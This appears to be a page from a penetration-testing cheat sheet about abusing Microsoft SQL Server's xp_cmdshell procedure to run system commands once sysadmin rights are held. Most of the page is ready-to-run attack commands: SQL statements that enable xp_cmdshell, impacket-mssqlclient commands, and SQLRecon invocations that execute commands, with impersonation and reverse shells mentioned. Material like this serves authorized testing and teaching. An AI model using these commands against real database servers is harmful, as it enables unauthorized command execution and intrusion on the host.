---
layout: default
title: Leverage xp_cmdshell Procedure
parent: Microsoft SQL
grand_parent: Databases
nav_order: 1
permalink: /databases/mssql/cmdshell/
---

# Leverage xp_cmdshell Procedure
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you are authenticated as database administrator, you are able to use `xp_cmdshell` to execute system command.

## Prerequisites

* Having sysadmin privileges on the Microsoft SQL instance.

## Exploit

To do it manually, enter following SQL requests.

```sql
-- This turns on advanced options and is needed to configure xp_cmdshell
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE

-- This enables xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

If you are connected with `impacket-mssqlclient`, you can leverage builtin commands provided by the tool.

```bash
# This enables xp_cmdshell, then reconfigure to apply changes.
enable_xp_cmdshell
RECONFIGURE

# Now you can leverage this feature to enumerate host or pop a reverse shell.
xp_cmdshell $command
```

Using [SQLRecon], you can use followings.

```powershell
# Add `/i:$domain\$username` to impersonate a user to perform this operation.
./SQLRecon.exe /a:wintoken /h:$hostname,$port /m:ienablexp
./SQLRecon.exe /a:wintoken /h:$hostname,$port /m:ixpcmd /c:$command
```